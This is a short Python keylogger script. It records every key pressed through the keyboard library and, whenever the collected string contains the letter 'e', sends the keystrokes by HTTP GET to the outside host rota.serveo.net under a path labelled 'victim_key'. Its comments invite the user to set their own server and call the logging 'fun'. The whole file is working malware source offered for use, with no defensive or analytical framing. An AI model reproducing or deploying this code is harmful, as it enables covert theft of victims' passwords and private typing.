import keyboard, requests, time
#Choose your Server IP and Port below...
host="rota.serveo.net"
port="443"
keystroke=""
#Actual fun begins from here!!!
while 1 == 1:
    keystroke+= keyboard.read_key() + "-"
    time.sleep(0.150)
    if keystroke.__contains__('e') == 1:
        requests.get('https://'+host+':'+port+'/victim_key:(' +keystroke+'++)')
        keystroke=""
